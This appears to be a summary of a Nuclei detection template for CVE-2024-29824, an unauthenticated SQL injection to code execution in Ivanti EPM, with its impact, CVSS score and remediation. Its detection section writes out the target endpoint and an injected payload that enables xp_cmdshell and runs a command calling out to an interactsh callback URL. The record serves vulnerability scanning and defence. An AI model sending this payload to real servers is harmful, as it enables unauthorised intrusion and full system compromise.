---
cve_id: CVE-2024-29824
template_path: nuclei-templates/http/cves/2024/CVE-2024-29824.yaml
affected_product: Ivanti EPM
severity: critical
authentication: none
external_callback: true
affected_versions: Ivanti EPM 2022 SU5 and prior
preconditions: attacker must be within the same network
poc_classification: rce
---

## Vulnerability
An unspecified SQL injection vulnerability in the Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code on the server.

Impact: Attackers can execute arbitrary code on the Ivanti EPM server, leading to complete system compromise.

Remediation: Apply security updates for Ivanti EPM that address CVE-2024-29824.

CVSS Score: 9.6 (CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

## PoC / Detection
Classification: rce

The template issues an unauthenticated POST request to `/WSStatusEvents/EventHandler.asmx` containing a crafted SOAP envelope. The payload injects SQL commands (`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup {{interactsh-url}}'--`) into the `<status>` element of an `<Action>`. It confirms exploitation by matching the 200 OK status, `application/soap+xml` Content-Type, `UpdateStatusEventsResponse` in the response body, and a DNS interaction via interactsh.

## References
- https://github.com/horizon3ai/CVE-2024-29824
- https://nvd.nist.gov/vuln/detail/CVE-2024-29824
- https://forums.ivanti.com/s/article/Security-Advisory-May-2024
- https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/
